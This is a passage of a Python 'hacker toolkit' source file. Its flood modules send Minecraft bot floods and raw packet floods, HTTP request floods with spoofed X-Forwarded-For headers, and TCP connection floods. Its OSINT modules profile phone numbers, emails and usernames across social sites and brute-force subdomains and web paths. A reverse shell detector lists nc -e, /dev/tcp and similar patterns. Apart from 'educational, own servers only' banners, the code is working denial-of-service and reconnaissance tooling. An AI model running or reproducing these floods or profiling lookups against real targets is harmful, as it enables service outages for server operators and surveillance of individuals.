        username = f"Bot_{random.randint(10000,99999)}_{random.choice(['X','Pro','YT','MC','OP','HD','TV'])}"
        login = _mc_packet(0x00, _mc_pstr(username))
        s.sendall(login)
        end = time.time() + 6
        while time.time() < end:
            try:
                s.settimeout(0.5)
                plen = _mc_read_varint(s)
                if plen:
                    pid = _mc_read_varint(s)
                    rest = plen - len(_mc_varint(pid))
                    data = b""
                    while len(data) < rest:
                        chunk = s.recv(rest - len(data))
                        if not chunk:
                            break
                        data += chunk
                    if pid == 0x21:
                        resp = _mc_packet(0x0F, data)
                        s.sendall(resp)
            except socket.timeout:
                continue
            except Exception:
                break
        s.close()
        results[idx] = 1
        return 1
    except Exception:
        results[idx] = 0
        return 0


def _nmap_quick_scan(target):
    if not shutil.which("nmap"):
        return []
    ports = []
    try:
        r = subprocess.run(["nmap", "-T4", "-F", target], capture_output=True, text=True, timeout=60)
        for line in r.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                ports.append(int(m.group(1)))
    except Exception:
        pass
    return ports


def stress_minecraft():
    box("Minecraft Stress Test [BOTS + FLOOD]", Fore.RED)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL -- Own/servers only {Style.RESET_ALL}\n")
    target = input(f"  {c(f'Server {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    host, ip = resolve_target(target)
    if not ip:
        return
    p_in = input(f"  {c(f'Port (25565) {SYM_PROMPT} ', CYAN)}").strip()
    port = int(p_in) if p_in.isdigit() else 25565
    bps_in = input(f"  {c(f'Bots per second (default 30) {SYM_PROMPT} ', CYAN)}").strip()
    bps = int(bps_in) if bps_in.isdigit() and int(bps_in) > 0 else 30
    dur_in = input(f"  {c(f'Duration in seconds (default 30) {SYM_PROMPT} ', CYAN)}").strip()
    dur = int(dur_in) if dur_in.isdigit() and int(dur_in) > 0 else 30
    pkts_in = input(f"  {c(f'Flood packets/sec (default 500) {SYM_PROMPT} ', CYAN)}").strip()
    pps = int(pkts_in) if pkts_in.isdigit() and int(pkts_in) > 0 else 500
    total_bots = bps * dur
    total_flood = pps * dur
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
    print(f"\n  {c(f'Mineflayer bots: {bps}/s x {dur}s = {total_bots} bots', YELLOW)}")
    print(f"  {c(f'Raw flood: {pps}/s x {dur}s = {total_flood} pkts', RED)}")
    start = time.time()
    stop = threading.Event()
    mf = None
    try:
        mf = subprocess.Popen(
            ["node", script_path, host, str(port), str(total_bots), str(dur)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
    except Exception as e:
        print(f"  {RED}Mineflayer failed: {e}{RESET}")
    try:
        ex = ThreadPoolExecutor(max_workers=min(pps, 500))
        active_f = {}
        f_idx = [0]
        while time.time() - start < dur and not stop.is_set():
            elapsed = time.time() - start
            done_f = [k for k, v in active_f.items() if v.done()]
            for k in done_f:
                active_f.pop(k)
            slots = min(pps, 500) - len(active_f)
            if slots > 0 and f_idx[0] < total_flood:
                n = min(slots, total_flood - f_idx[0], total_flood // max(dur, 1))
                for _ in range(n):
                    fid = f_idx[0]
                    active_f[fid] = ex.submit(_mc_flood_worker, host, port, {}, fid)
                    f_idx[0] += 1
            mf_line = ""
            if mf and mf.stdout and hasattr(mf.stdout, 'fileno') and _select_mod:
                try:
                    rfds, _, _ = _select_mod.select([mf.stdout], [], [], 0)
                    if rfds:
                        mf_line = mf.stdout.readline().strip()
                except Exception:
                    pass
            sys.stdout.write(f"\r  {c(f'Flood: {f_idx[0]}/{total_flood}', RED)} | {c(f'Active: {len(active_f)}', YELLOW)} | {c(f'{elapsed:.0f}s/{dur}s', CYAN)}  {mf_line}")
            sys.stdout.flush()
            time.sleep(0.02)
        ex.shutdown(wait=False)
        if mf:
            mf.terminate()
        print()
    except KeyboardInterrupt:
        stop.set()
        try:
            ex.shutdown(wait=False)
        except Exception:
            pass
        if mf:
            mf.terminate()
        print(f"\n  {c('Interrupted', YELLOW)}")
    flood_sent = f_idx[0]
    elapsed = time.time() - start
    pps_actual = flood_sent / elapsed if elapsed > 0 else 0
    print(f"\n  {c(f'{SYM_CHECK} Done: {flood_sent} flood pkts ({pps_actual:.0f}/s) + Mineflayer bots', GREEN)}\n")


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.2",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.4.0",
]


def _http_hit(host, port, use_ssl):
    try:
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{host}:{port}/?{random.randint(0,999999)}"
        ua = random.choice(USER_AGENTS)
        xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        r = requests.get(url, timeout=3, verify=False, stream=True, headers={
            "User-Agent": ua, "Connection": "close", "X-Forwarded-For": xff,
        })
        r.close()
        return 1
    except Exception:
        return 0


def stress_web():
    box("Web Stress Test [FIXED]", Fore.RED)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL -- Authorized targets only {Style.RESET_ALL}\n")
    target = input(f"  {c(f'Target (IP or domain) {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    host, ip_addr = resolve_target(target)
    if not ip_addr:
        return
    ports = _nmap_quick_scan(ip_addr)
    web_ports = sorted(set(p for p in ports if p in (80, 443, 8080, 8443, 8000, 8888))) if ports else []
    if web_ports:
        print(f"  {c('Detected web ports:', GREEN)} {c(str(web_ports), CYAN)}")
    else:
        print(f"  {YELLOW}No open ports from nmap. Enter manually or use defaults.{RESET}")
    p_in = input(f"  {c(f'Ports (comma-sep, default 80,443) {SYM_PROMPT} ', CYAN)}").strip()
    if p_in:
        try:
            web_ports = [int(x.strip()) for x in p_in.split(",") if x.strip().isdigit()]
        except Exception:
            web_ports = [80, 443]
    elif not web_ports:
        web_ports = [80, 443]
    concurrency = input(f"  {c(f'Concurrent connections (default 500) {SYM_PROMPT} ', CYAN)}").strip()
    max_conn = int(concurrency) if concurrency.isdigit() and int(concurrency) > 0 else 500
    total_reqs = input(f"  {c(f'Total requests per port (default 5000) {SYM_PROMPT} ', CYAN)}").strip()
    total_per = int(total_reqs) if total_reqs.isdigit() and int(total_reqs) > 0 else 5000
    grand_total_target = total_per * len(web_ports)
    print(f"\n  {c(f'Config: {max_conn} concurrent, {total_per} req/port, {grand_total_target} total', YELLOW)}")
    print(f"  {c('Testing connection...', CYAN)}", end="")
    try:
        scheme = "https" if web_ports[0] in (443, 8443) else "http"
        test_url = f"{scheme}://{host}:{web_ports[0]}/"
        tr = requests.get(test_url, timeout=5, verify=False, stream=True, headers={"User-Agent": "Mozilla/5.0", "Connection": "close"})
        print(f" {c(f'{tr.status_code} OK', GREEN)}")
        tr.close()
    except Exception as e:
        print(f" {c(f'FAILED ({type(e).__name__})', RED)}")
        choice = input(f"  {CYAN}[r]etry localhost / [f]orce / [c]ancel {SYM_PROMPT} {RESET}").strip().lower()
        if choice == "r":
            host = "127.0.0.1"
        elif choice != "f":
            return
    start = time.time()
    grand_total = 0
    stop = threading.Event()
    try:
        ex = ThreadPoolExecutor(max_workers=max_conn)
        for port in web_ports:
            use_ssl = port in (443, 8443)
            print(f"\n  {c(f'Attacking {host}:{port} with {max_conn} connections...', RED)}")
            port_total = 0
            done = 0
            batch_size = max_conn * 2
            for batch_start in range(0, total_per, batch_size):
                if stop.is_set():
                    break
                batch_end = min(batch_start + batch_size, total_per)
                fs = {ex.submit(_http_hit, host, port, use_ssl): i for i in range(batch_start, batch_end)}
                for f in as_completed(fs):
                    done += 1
                    r = f.result()
                    port_total += r
                    grand_total += r
                elapsed_now = time.time() - start
                rate = grand_total / elapsed_now if elapsed_now > 0 else 0
                pct = done / total_per * 100
                sys.stdout.write(f"\r  {c(f'[{pct:3.0f}%]', YELLOW)} {c(f'Hits: {port_total}', RED)} {c(f'{rate:.0f} req/s', GREEN)}    ")
                sys.stdout.flush()
            print(f"\n    {c(f'{host}:{port}', CYAN)} {c(f'{port_total} hits', GREEN)}")
        ex.shutdown(wait=False)
    except KeyboardInterrupt:
        stop.set()
        ex.shutdown(wait=False)
    elapsed = time.time() - start
    rate = grand_total / elapsed if elapsed > 0 else 0
    print(f"\n  {c(f'{SYM_CHECK} Done: {grand_total} hits in {elapsed:.1f}s ({rate:.0f} req/s)', GREEN)}\n")


def _ip_worker(ip, port, results, idx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, port))
        s.sendall(b"GET / HTTP/1.0\r\n\r\n")
        s.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def stress_ip():
    box("IP Flood Test", Fore.RED)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL -- Own infrastructure only {Style.RESET_ALL}\n")
    ip = input(f"  {c(f'Target IP {SYM_PROMPT} ', CYAN)}").strip()
    if not ip:
        return
    try:
        socket.inet_aton(ip)
    except OSError:
        print(f"  {RED}Invalid IP.{RESET}")
        return
    print(f"  {c('Ports:', CYAN)} [a]uto ({len(STRESS_PORTS)}) [m]anual")
    if input(f"  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip().lower() == "m":
        p_in = input(f"  {c(f'Ports (comma) {SYM_PROMPT} ', CYAN)}").strip()
        try:
            ports = [int(x.strip()) for x in p_in.split(",") if x.strip().isdigit()]
        except Exception:
            ports = STRESS_PORTS[:]
    else:
        ports = STRESS_PORTS[:]
    n_in = input(f"  {c(f'Connections (500) {SYM_PROMPT} ', CYAN)}").strip()
    nc = int(n_in) if n_in.isdigit() else 500
    total = nc * len(ports)
    sent = done = 0
    bs = 400
    start = time.time()
    stop = threading.Event()
    try:
        ex = ThreadPoolExecutor(max_workers=100)
        for b in range(0, total, bs):
            if stop.is_set():
                break
            be = min(b + bs, total)
            batch = list(range(b, be))
            br = {}
            fs = {ex.submit(_ip_worker, ip, ports[b % len(ports)], br, b): b for b in batch}
            for f in as_completed(fs):
                f.result()
            for v in br.values():
                sent += v
                done += 1
            sys.stdout.write(f"\r  {progress_bar(done, total)}  OK:{sent}  Er:{done-sent}  ")
            sys.stdout.flush()
        ex.shutdown(wait=False)
    except KeyboardInterrupt:
        stop.set()
        ex.shutdown(wait=False)
    elapsed = time.time() - start
    rate = sent / elapsed if elapsed > 0 else 0
    print(f"\n  {c(f'{SYM_CHECK} Done: {sent} conns x {len(ports)} ports in {elapsed:.1f}s ({rate:.1f} conn/s)', GREEN)}\n")


# ──────────────────────────────────────────────────────────
#  MODULE 8: OSINT
# ──────────────────────────────────────────────────────────

COUNTRY_CODES = {
    "1": "US/CA", "44": "UK", "91": "India", "86": "China", "81": "Japan",
    "49": "Germany", "33": "France", "39": "Italy", "34": "Spain", "7": "Russia",
    "55": "Brazil", "61": "Australia", "82": "Korea", "31": "Netherlands",
    "46": "Sweden", "41": "Switzerland", "45": "Denmark", "47": "Norway",
    "358": "Finland", "48": "Poland", "90": "Turkey", "966": "Saudi Arabia",
    "971": "UAE", "972": "Israel", "27": "South Africa", "52": "Mexico",
    "54": "Argentina", "56": "Chile", "351": "Portugal", "30": "Greece",
    "353": "Ireland", "43": "Austria", "32": "Belgium",
}

NPA_DB = {
    "212": ("New York", "NY", "Eastern"), "213": ("Los Angeles", "CA", "Pacific"),
    "305": ("Miami", "FL", "Eastern"), "312": ("Chicago", "IL", "Central"),
    "408": ("San Jose", "CA", "Pacific"), "415": ("San Francisco", "CA", "Pacific"),
    "617": ("Boston", "MA", "Eastern"), "646": ("New York", "NY", "Eastern"),
    "713": ("Houston", "TX", "Central"), "808": ("Honolulu", "HI", "Pacific"),
    "917": ("New York", "NY", "Eastern"),
}

SOCIAL_PLATFORMS = {
    "GitHub": ("https://github.com/{}", "user not found"),
    "Twitter/X": ("https://x.com/{}", "this account doesn"),
    "Reddit": ("https://www.reddit.com/user/{}", "page not found"),
    "YouTube": ("https://www.youtube.com/@{}/videos", "page not found"),
    "LinkedIn": ("https://www.linkedin.com/in/{}", "page not found"),
    "TikTok": ("https://www.tiktok.com/@{}", "couldn't find"),
    "Telegram": ("https://t.me/{}", "Sorry, this chat"),
    "Medium": ("https://medium.com/@{}", "page not found"),
    "Twitch": ("https://www.twitch.tv/{}", "page not found"),
    "Facebook": ("https://www.facebook.com/{}", "page not found"),
    "Patreon": ("https://www.patreon.com/{}", "page not found"),
    "Keybase": ("https://keybase.io/{}", "not found"),
    "Behance": ("https://www.behance.net/{}", "page not found"),
    "Dribbble": ("https://dribbble.com/{}", "page not found"),
    "SoundCloud": ("https://soundcloud.com/{}", "page not found"),
    "Replit": ("https://replit.com/@{}", "page not found"),
    "Codepen": ("https://codepen.io/{}", "page not found"),
    "Steam": ("https://steamcommunity.com/id/{}", "profile could not be found"),
    "Spotify": ("https://open.spotify.com/user/{}", "page not found"),
    "Wikipedia": ("https://en.wikipedia.org/wiki/User:{}", "page not found"),
    "HackerOne": ("https://hackerone.com/{}", "not found"),
    "Bugcrowd": ("https://bugcrowd.com/{}", "page not found"),
}

SUBDOMAIN_WORDLIST = [
    "www","mail","ftp","admin","api","dev","test","staging","blog","cdn","static",
    "assets","img","css","js","download","support","help","docs","wiki","forum",
    "shop","store","app","mobile","webmail","cpanel","ns1","ns2","smtp","pop",
    "imap","mx","calendar","drive","cloud","git","jenkins","jira","confluence",
    "redis","mongo","mysql","db","database","backup","monitor","status","analytics",
    "tracking","live","stream","news","info","about","contact","careers","jobs",
    "portal","my","client","login","register","account","billing","payment",
    "orders","cart","checkout","ssl","secure","vpn","proxy","gateway","firewall",
    "docker","k8s","kubernetes","gitlab","bitbucket","svn","bugzilla",
    "demo","example","beta","alpha","prod","qa","sso","auth","oauth","okta",
]


def osint_phone():
    box("Phone Number OSINT", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    num = input(f"  {c(f'Phone (+CC) {SYM_PROMPT} ', CYAN)}").strip()
    if not num:
        return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    print(f"\n  {c('Analyzing:', GREEN)} {cleaned}")
    detected = "Unknown"
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            detected = country
            break
    digits = cleaned.lstrip('+')
    length = len(digits)
    lines = [f"  Number: {c(cleaned, GREEN)}", f"  Country: {c(detected, YELLOW)}"]
    valid = (detected == 'India' and length == 12) or (detected == 'US/CA' and length == 11) or length >= 8
    lines.append(f"  Valid: {c(SYM_CHECK, GREEN) if valid else c(SYM_X, RED)}")
    wa_ok = tg_ok = False
    try:
        wr = requests.get(f"https://wa.me/{digits}", timeout=6, allow_redirects=False)
        wa_ok = wr.status_code in (200, 302)
    except Exception:
        pass
    try:
        tr = requests.get(f"https://t.me/{digits}", timeout=6)
        tg_ok = tr.status_code == 200 and "tgme_page" in tr.text
    except Exception:
        pass
    apps = [s for s, ok in [("WhatsApp", wa_ok), ("Telegram", tg_ok)] if ok]
    lines.append(f"  Apps: {c(', '.join(apps) if apps else 'Not found', GREEN if apps else YELLOW)}")
    if detected == "US/CA" and length == 11:
        npa = digits[1:4]
        city, state, tz = NPA_DB.get(npa, ("Unknown", "Unknown", "Unknown"))
        lines.append(f"  Location: {c(f'{city}, {state}', CYAN)} ({c(tz, YELLOW)})")
    info_box("Phone Intel", lines, Fore.YELLOW)
    print()


def osint_email():
    box("Email OSINT", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    email = input(f"  {c(f'Email {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not email or '@' not in email:
        return
    local, domain = email.split('@', 1)
    print(f"\n  {c('Analyzing:', GREEN)} {email}")
    domain_ip = ""
    try:
        domain_ip = socket.gethostbyname(domain)
    except Exception:
        pass
    spf = ""
    if shutil.which("dig"):
        try:
            r = subprocess.run(["dig", "+short", "TXT", domain], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "v=spf1" in line:
                    spf = line.strip()[:60]
                    break
        except Exception:
            pass
    gravatar = ""
    try:
        h = hashlib.md5(email.encode()).hexdigest()
        gr = requests.get(f"https://www.gravatar.com/avatar/{h}", timeout=5)
        if gr.status_code == 200 and len(gr.content) > 100:
            gravatar = "Found"
    except Exception:
        pass
    lines = [
        f"  Email: {c(email, GREEN)}",
        f"  Domain: {c(domain, CYAN)}",
        f"  IP: {c(domain_ip, MAGENTA) if domain_ip else c('N/A', RED)}",
        f"  SPF: {c(spf, GREEN) if spf else c('Not set', YELLOW)}",
        f"  Gravatar: {c(gravatar, GREEN) if gravatar else c('None', YELLOW)}",
    ]
    info_box("Email Intel", lines, Fore.YELLOW)
    print()


def osint_ipgeo():
    box("IP Geolocation", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    target = input(f"  {c(f'IP or domain {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {c(f'{SYM_CHECK} {target} -> {ip}', GREEN)}")
        except Exception:
            print(f"  {RED}Could not resolve.{RESET}")
            return
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting", timeout=10)
        d = r.json()
        if d.get("status") == "success":
            loc_str = f"{d.get('city','?')}, {d.get('regionName','?')} {d.get('zip','?')}"
            lines = [
                f"  IP: {c(ip, GREEN)}",
                f"  Location: {c(loc_str, MAGENTA)}",
                f"  Country: {c(d.get('country','?'), YELLOW)}",
                f"  ISP: {c(d.get('isp','?'), CYAN)}",
                f"  ASN: {c(d.get('as','?'), MAGENTA)}",
                f"  Proxy/VPN: {c(SYM_CHECK, RED) if d.get('proxy') or d.get('hosting') else c('No', GREEN)}",
            ]
            info_box("Geolocation", lines, Fore.YELLOW)
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def osint_dns():
    box("DNS Enumeration", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not domain:
        return
    has_dig = shutil.which("dig")
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
        records = []
        if has_dig:
            try:
                r = subprocess.run(["dig", "+short", domain, rtype], capture_output=True, text=True, timeout=5)
                if r.stdout.strip():
                    records = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()]
            except Exception:
                pass
        else:
            try:
                if rtype == "A":
                    records = [socket.gethostbyname(domain)]
            except Exception:
                pass
        if records:
            print(f"  {c(f'{rtype:5s}:', CYAN)} {c(', '.join(records[:3]), GREEN)}")
    print()


def osint_subdomain():
    box("Subdomain Discovery", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not domain:
        return
    print(f"  {c(f'Brute-forcing {len(SUBDOMAIN_WORDLIST)} words...', CYAN)}")
    found = []
    for i, sub in enumerate(SUBDOMAIN_WORDLIST):
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            found.append((fqdn, ip))
            print(f"  {c(SYM_CHECK, GREEN)} {c(fqdn, CYAN)} {SYM_ARROW} {c(ip, GREEN)}")
        except Exception:
            pass
        if i % 20 == 0:
            sys.stdout.write(f"\r  {c(f'{i}/{len(SUBDOMAIN_WORDLIST)}', CYAN)} Found: {c(len(found), GREEN)}  ")
            sys.stdout.flush()
        if i % 5 == 0:
            time.sleep(0.15)
    print(f"\n  {c(f'Found {len(found)} subdomains', GREEN)}\n")


def osint_social():
    box("Social Username Search", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    user = input(f"  {c(f'Username {SYM_PROMPT} ', CYAN)}").strip()
    if not user:
        return
    print(f"  {c(f'Checking {len(SOCIAL_PLATFORMS)} platforms...', CYAN)}")
    found = 0
    for plat, (tmpl, missing) in SOCIAL_PLATFORMS.items():
        url = tmpl.format(user)
        try:
            r = requests.get(url, timeout=6, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
            txt = r.text.lower()
            if missing.lower() in txt or r.status_code in (404, 410):
                continue
            if r.status_code == 200:
                found += 1
                print(f"  {c(SYM_CHECK, GREEN)} {c(plat+':', CYAN):16s} {c(url, GREEN)}")
        except Exception:
            pass
        time.sleep(0.2)
    print(f"  {c(f'Found {found}/{len(SOCIAL_PLATFORMS)}', GREEN)}\n")


def osint_website():
    box("Website Tech Recon", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    url = input(f"  {c(f'URL {SYM_PROMPT} ', CYAN)}").strip()
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    try:
        r = requests.get(url, timeout=10, headers={"User-Agent": "DarkieV3/1.0"})
        lines = [
            f"  URL: {c(r.url, GREEN)}",
            f"  Status: {c(str(r.status_code), YELLOW)}",
            f"  Size: {c(f'{len(r.content):,}B', MAGENTA)}",
        ]
        for h, lbl in [("Server", "Server"), ("X-Powered-By", "Powered"), ("X-Frame-Options", "XFO"),
                       ("Content-Security-Policy", "CSP"), ("Strict-Transport-Security", "HSTS")]:
            if h in r.headers:
                lines.append(f"  {lbl:8s}: {c(r.headers[h][:40], GREEN)}")
        info_box("HTTP Recon", lines, Fore.YELLOW)
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def osint_whois():
    box("Whois Lookup", Fore.YELLOW)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not domain:
        return
    if shutil.which("whois"):
        try:
            r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=30)
            for line in r.stdout.splitlines():
                if any(line.lower().startswith(k) for k in ["domain name", "registrar", "creation date",
                                                            "expir", "registrant", "name server", "dnssec", "status"]):
                    print(f"  {c(line.strip(), GREEN)}")
        except Exception:
            print(f"  {RED}Whois error.{RESET}")
    else:
        print(f"  {YELLOW}whois not installed.{RESET}")
    print()


def legacy_web_recon():
    box("Web Recon (Dir Brute + Ports)", Fore.YELLOW)
    target = input(f"  {c(f'Domain {SYM_PROMPT} ', CYAN)}").strip().lower()
    if not target:
        return
    if not target.startswith("http"):
        target = "https://" + target
    base = target.rstrip('/')
    parsed = urlparse(base)
    domain = parsed.netloc or parsed.path
    WEB_PATH_WORDLIST = [
        "admin","login","wp-admin","dashboard","api","v1","v2","graphql",
        ".env","robots.txt","sitemap.xml","backup","db","database","dump","sql",
        "phpmyadmin","config","setup","wp-content","uploads","download",
        "server-status","cgi-bin","test","dev","stage","logs","phpinfo.php",
        "swagger.json","openapi.json","docs","status","health","metrics",
    ]
    print(f"\n  {c('Phase 1: Port Scan', MAGENTA)}")
    open_ports = []
    if shutil.which("nmap"):
        try:
            r = subprocess.run(["nmap", "-T4", "-F", "--open", domain], capture_output=True, text=True, timeout=120)
            for line in r.stdout.splitlines():
                m = re.match(r'^(\d+)/tcp\s+open', line)
                if m:
                    p = int(m.group(1))
                    try:
                        svc = socket.getservbyport(p)
                    except OSError:
                        svc = "?"
                    open_ports.append((p, svc))
                    print(f"    {SYM_LV}{SYM_LH} {c(f'{p}', GREEN)} ({c(svc, CYAN)})")
        except Exception:
            pass
    print(f"\n  {c('Phase 2: Dir Brute-Force', MAGENTA)}")
    found = []
    for i, path in enumerate(WEB_PATH_WORDLIST):
        url = f"{base}/{path}"
        try:
            r = requests.get(url, timeout=4, headers={"User-Agent": "DarkieV3/1.0"}, allow_redirects=False)
            if r.status_code in (200, 301, 302, 403, 401):
                found.append((path, r.status_code))
                color = Fore.GREEN if r.status_code == 200 else Fore.YELLOW
                print(f"    {c(f'[{r.status_code}]', color)} {c(url, GREEN)}")
        except Exception:
            pass
        if i % 20 == 0:
            sys.stdout.write(f"\r    {c(f'{i}/{len(WEB_PATH_WORDLIST)}', CYAN)} Found: {c(len(found), GREEN)}  ")
            sys.stdout.flush()
    print(f"\n\n  {c(f'Results: {len(open_ports)} ports, {len(found)} paths', GREEN)}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 13: ADVANCED NETWORK
# ──────────────────────────────────────────────────────────

def net_port_knocking():
    box("Port Knocking Tester", Fore.BLUE)
    print(f"  {Back.RED}{Fore.WHITE} EDUCATIONAL USE ONLY {Style.RESET_ALL}\n")
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    ports_in = input(f"  {c(f'Knock sequence (comma-sep, e.g. 7000,8000,9000) {SYM_PROMPT} ', CYAN)}").strip()
    if not ports_in:
        return
    try:
        ports = [int(p.strip()) for p in ports_in.split(",") if p.strip().isdigit()]
    except Exception:
        print(f"  {RED}Invalid ports.{RESET}")
        return
    final_port = input(f"  {c(f'Final port to check (22) {SYM_PROMPT} ', CYAN)}").strip()
    final_port = int(final_port) if final_port.isdigit() else 22
    print(f"\n  {c(f'Knocking {target}: {ports}', CYAN)}")
    separator(Fore.BLUE)
    try:
        ip = socket.gethostbyname(target)
        for p in ports:
            print(f"  {c(f'Knock port {p}...', CYAN)}", end="")
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect_ex((ip, p))
                s.close()
                print(f" {c('sent', GREEN)}")
            except Exception:
                print(f" {c('error', RED)}")
            time.sleep(0.5)
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        result = s.connect_ex((ip, final_port))
        s.close()
        if result == 0:
            print(f"\n  {RED}{SYM_WARN} Port {final_port} is now OPEN after knock!{RESET}")
            add_log_alert("HIGH", "PortKnock", f"Port {final_port} opened after knock sequence")
        else:
            print(f"\n  {GREEN}{SYM_CHECK} Port {final_port} still closed.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


def net_banner_grab():
    box("Banner Grabbing", Fore.BLUE)
    target = input(f"  {c(f'Target {SYM_PROMPT} ', CYAN)}").strip()
    if not target:
        return
    ports_in = input(f"  {c(f'Ports (comma-sep or common) {SYM_PROMPT} ', CYAN)}").strip()
    if ports_in:
        try:
            ports = [int(p.strip()) for p in ports_in.split(",") if p.strip().isdigit()]
        except Exception:
            ports = [21, 22, 25, 80, 110, 143, 443, 993, 995]
    else:
        ports = [21, 22, 25, 80, 110, 143, 443, 993, 995]
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(f"  {RED}Could not resolve.{RESET}")
        return
    print(f"\n  {c('Banners:', CYAN)}")
    separator(Fore.BLUE)
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            if port in (80, 443, 8080, 8443):
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            else:
                s.sendall(b"\r\n")
            banner = s.recv(1024).decode(errors="replace").strip()
            s.close()
            if banner:
                print(f"    {c(f'Port {port:5d}', GREEN)} {c(banner[:80], CYAN)}")
            else:
                print(f"    {c(f'Port {port:5d}', GREEN)} {cdim('no banner', Fore.WHITE)}")
        except Exception:
            print(f"    {c(f'Port {port:5d}', GREEN)} {c('closed', RED)}")
    print()


def net_reverse_shell_detect():
    box("Reverse Shell Detector", Fore.RED)
    print(f"  {c('Checking for reverse shell patterns...', RED)}")
    separator(Fore.RED)
    patterns = [
        (r'bash\s+-i', "bash -i"),
        (r'nc\s+-e', "nc -e"),
        (r'ncat\s+-e', "ncat -e"),
        (r'socat\s+', "socat"),
        (r'/dev/tcp/', "/dev/tcp/"),
        (r'python.*socket.*connect', "python socket"),
        (r'perl.*socket.*connect', "perl socket"),
        (r'ruby.*TCPSocket', "ruby TCPSocket"),
        (r'php.*fsockopen', "php fsockopen"),
        (r'mkfifo.*nc', "mkfifo + nc"),
        (r'0<&.*-', "fd redirect"),
        (r'exec\s+\d+<>/dev/tcp', "exec /dev/tcp"),
    ]
    found = []
    try:
        r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            for pat, desc in patterns:
                if re.search(pat, line, re.IGNORECASE):
                    found.append((desc, line.strip()[:100]))
                    print(f"    {c(SYM_X, RED)} [{desc}] {c(line.strip()[:80], YELLOW)}")
                    add_log_alert("CRITICAL", "RevShell", f"Pattern: {desc}")
    except Exception:
        pass
    try:
        r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "ESTAB" in line or ("0.0.0.0" in line and "LISTEN" in line):
                if any(x in line for x in ["4444", "5555", "6666", "7777", "8888", "9999", "1337"]):
                    print(f"    {c(SYM_WARN, YELLOW)} Suspicious port in: {line.strip()[:80]}")
    except Exception:
        pass
    if not found:
